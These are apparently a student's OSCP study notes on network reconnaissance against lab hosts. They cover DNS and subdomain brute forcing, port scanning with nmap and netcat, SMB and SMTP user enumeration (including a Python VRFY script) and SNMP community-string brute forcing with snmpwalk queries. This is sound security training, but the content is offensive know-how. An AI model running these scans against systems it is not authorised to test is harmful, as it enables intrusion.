---
title: "[OSCP, PEN-200] Instructional notes - Part 1"
date: 2024-11-03
author: "CHW"
tags:
  - offsec
description: "OSCP PEN-200 筆記 Part 1，涵蓋 recon、enumeration、vulnerability scanning、web attacks 與 client-side exploits。"
---

[OSCP, PEN-200] Instructional notes - Part 1
===

# Table of Contents
[TOC]

# Recon

## Whois
```
whois {Target domain/ip} -h {指定WHOIS 伺服器}
```

## Google Hacking
```
👉🏻 site:
👉🏻 ext: {filetype}
👉🏻 filetype:
👉🏻 -filetype: 排除

intitle:"index of" "parent directory"
> 標題包含 index of 與 頁面上包含 parent directory

```
● [Google Hacking Database (GHDB)](https://www.exploit-db.com/google-hacking-database)

## Open-Source Code
Github search:
```
owner:megacorpone path:users
```
![image](https://hackmd.io/_uploads/B1PHC86aR.png)
> 找到 user 和 hash 過的 password

## DNS
### 1. host
```
┌──(kali㉿kali)-[~]
└─$ host -t txt megacorpone.com
megacorpone.com descriptive text "google-site-verification=U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA"
megacorpone.com descriptive text "Try Harder"
                                                                             
┌──(kali㉿kali)-[~]
└─$ host www.megacorpone.com  
www.megacorpone.com has address 149.56.244.87
                                                                             
┌──(kali㉿kali)-[~]
└─$ host -t mx megacorpone.com 
megacorpone.com mail is handled by 60 mail2.megacorpone.com.
megacorpone.com mail is handled by 20 spool.mail.gandi.net.
megacorpone.com mail is handled by 10 fb.mail.gandi.net.
megacorpone.com mail is handled by 50 mail.megacorpone.com.
                                                                             
┌──(kali㉿kali)-[~]
└─$ host -t txt megacorpone.com
megacorpone.com descriptive text "Try Harder"
megacorpone.com descriptive text "google-site-verification=U7B_b0HNeBtY4qYGQZNsEYXfCJ32hMNV3GtC0wWq5pA"

```

### 2. dnsrecon
Brute forcing hostnames using dnsrecon
```
kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
[*] Using the dictionary file: /home/kali/list.txt (provided by user)
[*] brt: Performing host and subdomain brute force against megacorpone.com...
[+] 	 A www.megacorpone.com 149.56.244.87
[+] 	 A mail.megacorpone.com 51.222.169.212
[+] 	 A router.megacorpone.com 51.222.169.214
[+] 3 Records Found
```
`-d` : 選項指定域名\
`-D` : 指定包含潛在子域字串的檔案名\
`-t` : 指定要執行的枚舉類型

### 3. dnsrecon 與 host 差異
![image](https://hackmd.io/_uploads/BkH3h9Vl1x.png)

### xfreerdp (RDP Tool)
```
brew install freerdp
xfreerdp /v:<server_ip> /u:<username> /p:<userpwd>
```
`/u`: username\
`/p`: password\
`/v`: ip address

### 4. nslookup
```
C:\Users\chw>nslookup -type=TXT info.megacorptwo.com 192.168.239.151
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.239.151

info.megacorptwo.com    text =

        "greetings from the TXT record body"
```

## Netcat
- NC 送 TCP 封包
```
┌──(kali㉿kali)-[~]
└─$ nc -nvv -w 1 -z 192.168.50.152 3388-3390
(UNKNOWN) [192.168.50.152] 3390 (?) : Connection timed out
(UNKNOWN) [192.168.50.152] 3389 (ms-wbt-server) : Connection timed out
(UNKNOWN) [192.168.50.152] 3388 (?) : Connection timed out
 sent 0, rcvd 0
```
`-n`：指示 Netcat 不進行 DNS 解析，直接使用 IP 地址。\
`-v`：設置詳細模式（verbose），輸出更多細節。\
`-v`：再次增加詳細程度，通常第二個 -v 會使輸出信息更詳細。\
`-w 1`：設定等待超時時間為 1 秒，即每個端口掃描若無回應便會中止。\
`-z`：設置 Netcat 進行掃描模式，不傳輸數據，只檢查端口開啟狀態。 (防止 IPS/IDS 偵測)

>[!Note] 
> Wireshark capture package


- NC 送 UDP 封包
```
┌──(kali㉿kali)-[~]
└─$ nc -nv -u -z -w 1 192.168.50.149 120-123
(UNKNOWN) [192.168.50.149] 123 (ntp) open
(UNKNOWN) [192.168.50.149] 122 (?) open
(UNKNOWN) [192.168.50.149] 121 (?) open
(UNKNOWN) [192.168.50.149] 120 (?) open
```
`-u`：使用 UDP 協議進行掃描（預設為 TCP）。

## iptables 監控流量 (not available on macOS)
>[!Important] 
>`iptables`: 管理 Linux 防火牆的工具
```
┌──(chw㉿CHW-kali)-[~/Desktop/Reverse]
└─$ sudo iptables -I INPUT 1 -s 192.168.218.129 -j ACCEPT 

┌──(chw㉿CHW-kali)-[~/Desktop/Reverse]
└─$ sudo iptables -I OUTPUT 1 -d 192.168.218.129 -j ACCEPT
 
┌──(chw㉿CHW-kali)-[~/Desktop/Reverse]
└─$ sudo iptables -Z 
```
`-I INPUT 1`: 在 INPUT chain 的第一個位置插入 rule。\
`-I OUTPUT 1`: 在 OUTPUT chain 的第一個位置插入 rule。\
`-s 192.168.218.129`: Source IP 為 192.168.218.129。\
`-j ACCEPT`: 如果符合規則，允許流量通過。


> 以上設定與 192.168.218.129 之間的雙向流量，同時重置counters 便於監控流量。

用 Nmap 送流量測試。
:::spoiler
![image](https://hackmd.io/_uploads/B18Io5jxyg.png)

:::

```
┌──(chw㉿CHW-kali)-[~]
└─$ sudo iptables -vn -L
Chain INPUT (policy ACCEPT 145 packets, 8531 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 4008  200K ACCEPT     all  --  *      *       192.168.218.129      0.0.0.0/0           
    0     0 ACCEPT     all  --  *      *       192.168.50.149       0.0.0.0/0           
    0     0 ACCEPT     all  --  *      *       192.168.50.149       0.0.0.0/0           
    0     0 ACCEPT     all  --  *      *       192.168.50.149       0.0.0.0/0           
    0     0 ACCEPT     all  --  *      *       192.168.50.149       0.0.0.0/0           

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy ACCEPT 104 packets, 8454 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 4008  200K ACCEPT     all  --  *      *       0.0.0.0/0            192.168.218.129     
    0     0 ACCEPT     all  --  *      *       0.0.0.0/0            192.168.50.149      
    0     0 ACCEPT     all  --  *      *       0.0.0.0/0            192.168.50.149 
```
`-v`: 詳細模式。通顯示每條規則的額外資訊，例如 pkts, bytes。\
`-n`: 不進行 DNS 解析。顯示 IP 不轉換為 Domain name，加快輸出速度。\
`-L`: 列出當前的防火牆規則。

> iptables (src: 192.168.218.129)：經過 nmap 後，
> 1. **Chain INPUT** 中 ，處理了 145 packets, 8531 bytes。
> 2. **Chain FORWARD** 預設也是 ACCEPT，沒有流量經過。
> 3. **Chain OUTPUT** 代表從本機送出的流量，處理了 104 packets, 8454 bytes

## Nmap
Nmap TCP connect scan makes use of the **Berkeley sockets API** to perform the three-way handshake, it **does not require elevated privileges**.

>[!Important]
nmap <參數> <DistIP>\
**<參數>**:\
`-v`：verbose的縮寫，表示詳細模式。\
`-sS` : 半開掃描，只送 SYN 檢測端口是否開放。\
`-sT` : 全開掃描，建立完整 TCP 三項交握進行掃描。
`-sU` : UDP 掃描，用於掃描 UDP 端口。掃描方式與 tcp 不同。\
`-A` : 全面掃描，包含系統檢測、版本檢測、服務偵測和腳本掃描等。\
`-O` : 作業系統檢測。\
`-sC` : 使用預設的 Nmap Scripting Engine (NSE) 腳本進行掃描，可以檢測漏洞、執行探測等。\
`-sV` : 嘗試識別服務的版本，提供更詳細的服務資訊。\
`-T4` : 時間模板。\
`-sn` : Ping 掃描，只掃主機，不掃任何端口。檢查哪些主機在線。\
`-Pn`: 跳過主機存活檢測，直接進行端口掃描。\
`--top-ports=20` : 最常見的 20 個 port 。\
`--script <scriptname>`: 指定的 Nmap NSE 腳本。\
Ex. --script http-headers : **NSE scripts are located in the /usr/share/nmap/scripts**\
`-oG <filename>` : 輸出結果為 grepable 格式，便於後續分析。\
`-oN <filename>` : 輸出標準格式。\
`-oX <filename>` : 輸出 XML 格式。\
`-p <port range>` : 指定 port。\
`-iL <inputfile>` : 從檔案讀取目標 IP 或 DN。\

> --top-ports=20 最常見的 20 個 port 來自 /usr/share/nmap/nmap-services
```
┌──(chw㉿CHW-kali)-[~]
└─$ cat /usr/share/nmap/nmap-services
# ...
tcpmux  1/tcp   0.001995        # TCP Port Service Multiplexer [rfc-1078] | TCP Port Service Multiplexer
tcpmux  1/udp   0.001236        # TCP Port Service Multiplexer
compressnet     2/tcp   0.000013        # 
systat  11/udp  0.000577        # Active Users
...
```
    
>[!Note]
> 在區網快速搜尋 80 port service

```
nmap -p 80 --script http-title.nse {IP}/{MASK}
```
![image](https://hackmd.io/_uploads/SJW13qkWyx.png)


##  Test-NetConnection - Windows nmap
```
PS C:\Users\chw> Test-NetConnection -Port 445 192.168.50.151

ComputerName     : 192.168.50.151
RemoteAddress    : 192.168.50.151
RemotePort       : 445
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.50.152
TcpTestSucceeded : True
```
透過 Powershell 使用 Net.Sockets.TcpClient object。\
對於 192.168.50.151 port 1~1024，輸出對應 TCP Port 資訊，不會顯示連接失敗的錯誤。
```
PS C:\Users\chw> 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
TCP port 88 is open
...
```
## SMB Enumeration (identifying NetBIOS)
>[!Tip]
> SMB（Server Message Block），又稱網路檔案分享系統（Common Internet File System，縮寫為CIFS），一種應用層網路傳輸協定，由微軟開發，主要功能是使網路上的機器能夠共享電腦檔案、印表機、序列埠和通訊等資源。它也提供經認證的行程間通訊機能。它主要用在裝有Microsoft Windows的機器上，在這樣的機器上被稱為 Microsoft Windows Network。\
> TCP port: 445\
> UDP ports 137, 138 & TCP ports 137, 139 (NetBIOS over TCP/IP)

### nbtscan
```
┌──(chw㉿CHW-kali)-[/usr/share/nmap/scripts]
└─$ sudo nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
┌──(chw㉿CHW-kali)-[/usr/share/nmap/scripts]
└─$ cat smb.txt                                         
# Nmap 7.92 scan initiated Thu Mar 17 06:03:12 2022 as: nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
# Ports scanned: TCP(2;139,445) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.50.1 ()	Status: Down
...
Host: 192.168.50.21 ()	Status: Up
Host: 192.168.50.21 ()	Ports: 139/closed/tcp//netbios-ssn///, 445/closed/tcp//microsoft-ds///
...
Host: 192.168.50.217 ()	Status: Up
Host: 192.168.50.217 ()	Ports: 139/closed/tcp//netbios-ssn///, 445/closed/tcp//microsoft-ds///
# Nmap done at Thu Mar 17 06:03:18 2022 -- 254 IP addresses (15 hosts up) scanned in 6.17 seconds
    
┌──(chw㉿CHW-kali)-[/usr/share/nmap/scripts]
└─$ sudo nbtscan -r 192.168.50.0/24
Doing NBT name scan for addresses from 192.168.50.0/24

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
192.168.50.124   SAMBA            <server>  SAMBA            00:00:00:00:00:00
192.168.50.134   SAMBAWEB         <server>  SAMBAWEB         00:00:00:00:00:00
...
```

Q: Walk Through - Information Gathering - SMB Enumeration - 192.168.215.0/24 and use Nmap to create a list of the SMB servers in the VM Group 1. How many hosts have port 445 open?
```
CWei@CHW-MacBook-Pro OSCP % nmap -v -p 445 192.168.215.1/24 | grep "445/tcp open"
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
445/tcp open  microsoft-ds
CWei@CHW-MacBook-Pro OSCP % nmap -v -p 445 192.168.215.1/24 | grep "445/tcp open" | wc -l
      10
```        

###  net view - Windows nbtscan
```
C:\Users\chw>net view \\dc01 /all
Shared resources at \\dc01

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
ADMIN$      Disk           Remote Admin
C$          Disk           Default share
IPC$        IPC            Remote IPC
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.
```
`net view`：查看網路上其他電腦的共享資源的指令。\
`\\dc01`：指定目標電腦名稱（dc01，通常是指網域控制站）來查看它上的共享資源。\
`/all`：顯示所有資源的詳細資訊，包括隱藏的共享資源。list the administrative shares ending with the dollar sign ($).
    
### enum4linux
用於列舉Windows和Samba主機中的資料。
![image](https://hackmd.io/_uploads/SyfxjK7bkl.png)

```
CWei@CHW-MacBook-Pro enum4linux % perl enum4linux.pl 192.168.215.13
"my" variable $which_output masks earlier declaration in same scope at enum4linux.pl line 280.
WARNING: polenum is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Nov  2 19:16:04 2024

 =========================================( Target Information )=========================================

Target ........... 192.168.215.13
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.215.13 )===========================

Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it

[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.215.13 )===============================

Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Looking up status of 192.168.215.13
	SAMBA           <00> -         B <ACTIVE>  Workstation Service
	SAMBA           <03> -         B <ACTIVE>  Messenger Service
	SAMBA           <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.215.13 )==================================


[+] Server 192.168.215.13 allows sessions using username '', password ''


 ===============================( Getting domain SID for 192.168.215.13 )===============================

Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 192.168.215.13 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.215.13 from srvinfo:
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
	SAMBA          Wk Sv PrQ Unx NT SNT samba server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ======================================( Users on 192.168.215.13 )======================================

Use of uninitialized value $users in print at enum4linux.pl line 1028.
Use of uninitialized value $users in pattern match (m//) at enum4linux.pl line 1031.

Use of uninitialized value $users in print at enum4linux.pl line 1046.
Use of uninitialized value $users in pattern match (m//) at enum4linux.pl line 1048.

 ================================( Share Enumeration on 192.168.215.13 )================================

Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	files           Disk      Flag: OS{e14e252c16545cbf8f8a5f720a1f6370}
	IPC$            IPC       IPC Service (samba server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.215.13

//192.168.215.13/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
NT_STATUS_IO_TIMEOUT listing \*
//192.168.215.13/files	Mapping: N/A Listing: N/A Writing: N/A

[E] Can't understand response:

Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.215.13/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.215.13 )===========================


[E] Dependent program "polenum" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/



 ======================================( Groups on 192.168.215.13 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 =================( Users on 192.168.215.13 via RID cycling (RIDS: 500-550,1000-1050) )=================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-21-4030004202-475240355-4120303355 and logon username '', password ''

S-1-5-21-4030004202-475240355-4120303355-501 SAMBA\nobody (Local User)
S-1-5-21-4030004202-475240355-4120303355-513 SAMBA\None (Domain Group)
```

## SMTP Enumeration
>[!Tip]
> SMTP: Simple Mail Transfer Protocol. port: 25

### Python script the SMTP user enumeration
```python=
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```

```
┌──(chw㉿CHW-kali)-[/]
└─$ python3 smtp.py root 192.168.50.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'252 2.0.0 root\r\n'
```
- 伺服器回應
`b'220 mail ESMTP Postfix (Ubuntu)`: 表示 SMTP 伺服器（使用 Postfix 郵件傳送代理）已經啟動並準備接受連接。220 是 SMTP 協議中的一個狀態碼，表示服務器準備好進行通信。
- VRFY 命令結果
`b'252 2.0.0 root`: 表示用戶 root 是有效的郵件帳戶，並且服務器接受了該請求。 252 表示服務器成功識別了這個用戶名。

```
┌──(chw㉿CHW-kali)-[/]
└─$ python3 smtp.py johndoe 192.168.50.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'550 5.1.1 <johndoe>: Recipient address rejected: User unknown in local recipient table\r\n'
```
- 伺服器回應
`b'220 mail ESMTP Postfix (Ubuntu)`
- VRFY 命令結果
`b'550 5.1.1 <johndoe>: Recipient address rejected: User unknown in local recipient table`: 表示用戶 johndoe 不存在。 550 表示請求的郵件地址無法接受，5.1.1 是一個具體的錯誤代碼，表示用戶地址未知。

### telnet (Windows Test-NetConnection can't interacting with SMTP)
```
PS C:\Users\chw> Test-NetConnection -Port 25 192.168.50.8

ComputerName     : 192.168.50.8
RemoteAddress    : 192.168.50.8
RemotePort       : 25
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.50.152
TcpTestSucceeded : True
```
```
PS C:\Windows\system32> dism /online /Enable-Feature /FeatureName:TelnetClient  
... (Installing the Telnet client)

C:\Windows\system32> telnet 192.168.50.8 25
220 mail ESMTP Postfix (Ubuntu)
VRFY goofy
550 5.1.1 <goofy>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root
```
(In MacOS/Linux)
```
CWei@CHW-MacBook-Pro SMTP user enumeration % nmap -nv -p 25 192.168.215.1/24
Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-02 21:32 CST
Initiating Ping Scan at 21:32
Scanning 256 hosts [2 ports/host]
...
Nmap scan report for 192.168.215.8
Host is up (0.11s latency).

PORT   STATE SERVICE
25/tcp open  smtp
...

CWei@CHW-MacBook-Pro SMTP user enumeration % python3 SMTP_script.py root 192.168.215.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'252 2.0.0 root\r\n'
CWei@CHW-MacBook-Pro SMTP user enumeration % nc 192.168.215.8 25
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
|
```

## SNMP Enumeration
>[!Tip]
> SNMP: Simple Network Management Protocol.\
> SNMP is based on UDP. 常用的 SNMP protocols 1, 2, and 2c 未加密.
> SNMPv3, which provides authentication and encryption.

![image](https://hackmd.io/_uploads/BkPK6C4ZJe.png)

### SNMP MIB Tree
>[!Tip]
> SNMP Management Information Base (MIB).
> SNMP 中用來組織和存取設備管理數據的階層式結構。它將設備的各種資訊，如網路狀態、硬體和軟體參數等，以樹狀結構組織，並使用唯一的 OID（物件標識碼，Object Identifier）來識別每個項目。

```
┌──(chw㉿CHW-kali)-[/]
└─$ sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 06:02 EDT
Nmap scan report for 192.168.50.151
Host is up (0.10s latency).

PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
...
```
### onesixtyone (SNMP scanner)
>[!Tip]
>![image](https://hackmd.io/_uploads/B1gxj6NZ1l.png)

```
CWei@CHW-MacBook-Pro ~ % onesixtyone
onesixtyone 0.3.4 [options] <host> <community>
  -c <communityfile> file with community names to try
  -i <inputfile>     file with target hosts
  -o <outputfile>    output log
  -p                 specify an alternate destination SNMP port
  -d                 debug mode, use twice for more information

  -s                 short mode, only print IP addresses

  -w n               wait n milliseconds (1/1000 of a second) between sending packets (default 10)
  -q                 quiet mode, do not print log to stdout, use with -o
host is either an IPv4 address or an IPv4 address and a netmask
default community names are: public private

Max number of hosts : 		65536
Max community length: 		32
Max number of communities: 	16384


examples: onesixtyone 192.168.4.0/24 public
          onesixtyone -c dict.txt -i hosts -o my.log -w 100
```
![image](https://hackmd.io/_uploads/HJA4YTVbyx.png)

- 將三個常見的社群名稱 public、private 和 manager 寫入 community 檔案
```
CWei@CHW-MacBook-Pro onesixtyone % cat community
public
private
manager
```
- 生成 IP 範圍 192.168.50.1 至 192.168.50.254，並將結果存入 ips 檔案。
```
CWei@CHW-MacBook-Pro onesixtyone % for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```
- 使用 -c 參數指定 community 檔案（包含社群名稱），-i 參數指定 ips 檔案（包含目標 IP list）
```
CWei@CHW-MacBook-Pro onesixtyone % onesixtyone -c community -i ips
Scanning 254 hosts, 3 communities
```
> Using onesixtyone to brute force community strings

### snmpwalk (query and retrieve SNMP)
>[!Tip]
>![image](https://hackmd.io/_uploads/S1dPsTNbkx.png)

>[!Important]
> **SNMP Object Identifier**:\
https://advdownload.advantech.com/productfile/Downloadfile5/1-1EE6T69/Aplication_Guide_SNMP%20OID.pdf
>> SNMP MIB tree structure 是透過 OID 管理
    
#### 1. snmpwalk enumerate the entire MIB tree
> 透過查詢 MIB tree 可以知道 OID 架構，進階搜尋 Windows users, processes, installed software ..etc
```
┌──(chw㉿CHW-kali)-[/]
└─$ snmpwalk -c public -v1 -t 10 192.168.50.151
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.3
iso.3.6.1.2.1.1.3.0 = Timeticks: (78235) 0:13:02.35
iso.3.6.1.2.1.1.4.0 = STRING: "admin@megacorptwo.com"
iso.3.6.1.2.1.1.5.0 = STRING: "dc01.megacorptwo.com"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 79
iso.3.6.1.2.1.2.1.0 = INTEGER: 24
...
```
snmpwalk 輸出從 192.168.50.151 取得的 SNMP 資訊:
- `STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"`: 使用 Windows 作業系統，具體版本是 Windows 6.3。
- `OID: iso.3.6.1.4.1.311.1.1.3.1.3`: 設備的 MIB（管理資訊基底）物件 ID（OID），用於唯一識別此設備類型，該 OID 與特定的系統製造商相關。
- `Timeticks: (78235) 0:13:02.35`: 設備運行時間（Uptime），已開機約 13 分鐘 2 秒。
- `STRING: "admin@megacorptwo.com"`: 管理員 Email。
- `STRING: "dc01.megacorptwo.com"`: 主機名稱。
- `iso.3.6.1.2.1.1.6.0 = ""`: 設備的物理位置未設定。
- `INTEGER: 79`: sysServices 服務類型數量或指標。[RFC 定義](https://hackmd.io/_uploads/Hk9mlRVWJx.png)
- `INTEGER: 24`: ifNumber 網路介面數量。 [補充](https://hackmd.io/_uploads/rykVbCNZkg.png)

#### 2. snmpwalk enumerate Windows users
```
┌──(chw㉿CHW-kali)-[/]
└─$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.107.114.98.116.103.116 = STRING: "krbtgt"
iso.3.6.1.4.1.77.1.2.25.1.1.7.115.116.117.100.101.110.116 = STRING: "student"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
```
`OID 1.3.6.1.4.1.77.1.2.25` 通常與 Microsoft Windows 系統中的某些特定對象相關，特別是與用戶賬戶資訊有關。OID 是一個屬於企業私有範圍的 Object Identifier，在這裡 1.3.6.1.4.1.77 是 Microsoft 的 Identifier。

#### 3. snmpwalk enumerate Windows processes
```
┌──(chw㉿CHW-kali)-[/]
└─$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
iso.3.6.1.2.1.25.4.2.1.2.88 = STRING: "Registry"
iso.3.6.1.2.1.25.4.2.1.2.260 = STRING: "smss.exe"
iso.3.6.1.2.1.25.4.2.1.2.316 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.372 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.472 = STRING: "svchost.exe"
iso.3.6.1.2.1.25.4.2.1.2.476 = STRING: "wininit.exe"
iso.3.6.1.2.1.25.4.2.1.2.484 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.540 = STRING: "winlogon.exe"
iso.3.6.1.2.1.25.4.2.1.2.616 = STRING: "services.exe"
iso.3.6.1.2.1.25.4.2.1.2.632 = STRING: "lsass.exe"
iso.3.6.1.2.1.25.4.2.1.2.680 = STRING: "svchost.exe"
...
```
查詢的 OID 1.3.6.1.2.1.25.4.2.1.2 返回了系統上正在運行的process 名稱。這個 OID 是屬於 HOST-RESOURCES-MIB 的一部分。

#### 4. snmpwalk enumerate installed software
```
┌──(chw㉿CHW-kali)-[/]
└─$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.27.29016"
iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "VMware Tools"
iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "Microsoft Visual C++ 2019 X64 Additional Runtime - 14.27.29016"
iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.27.290"
iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.27.290"
iso.3.6.1.2.1.25.6.3.1.2.6 = STRING: "Microsoft Visual C++ 2019 X86 Additional Runtime - 14.27.29016"
iso.3.6.1.2.1.25.6.3.1.2.7 = STRING: "Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.27.29016"
...
```

#### 5. snmpwalk enumerate open TCP ports
```
┌──(chw㉿CHW-kali)-[/]
└─$ snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.88.0.0.0.0.0 = INTEGER: 88
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.0 = INTEGER: 135
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.389.0.0.0.0.0 = INTEGER: 389
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.445.0.0.0.0.0 = INTEGER: 445
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.464.0.0.0.0.0 = INTEGER: 464
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.593.0.0.0.0.0 = INTEGER: 593
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.636.0.0.0.0.0 = INTEGER: 636
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.3268.0.0.0.0.0 = INTEGER: 3268
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.3269.0.0.0.0.0 = INTEGER: 3269
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.5357.0.0.0.0.0 = INTEGER: 5357
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.5985.0.0.0.0.0 = INTEGER: 5985
...
```
`Port 88`: Kerberos 認證服務。\
`Port 135`: Windows RPC 服務。\
`Poer 389`: LDAP。\
`Port 445`: Microsoft 文件共享協定。\
`Port 464`: Kerberos 更改密碼。\
`Port 593`: 與 Windows RPC 服務有關。
    
# Vulnerability Scanning
Common types of vulnerability scanners are `web application` and `network vulnerability scanners`.
![CVSS Ratings](https://hackmd.io/_uploads/S1bZqyHZke.png)
-  [CVSS calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
> Important term in vuln scan: `False positive` & `False negative`\
> In PT, find the right balance between manual and automated vulnerability scanning.

- External Vuln Scan
    - DMZ and public-facing services
    - Find externally exposed sensitive systems and services
- Internal Vuln Scan
    - Get VPN access or perform the scan on-site.
    - Analyze which vectors an attacker can use after breaching the perimeter
- Authenticated Vuln Scan
    - The scanner logs in to the target with a set of valid credentials
    - Check for vulnerable packages, missing patches, or configuration vulnerabilities.
- Unauthenticated Vuln Scan
    - Find vulnerabilities in remotely accessible services on a target.
    - Map the system with all open ports and attack surface by matching the info to vuln databases


-  [Nessus documentation](https://docs.tenable.com/nessus/Content/Settings.htm)
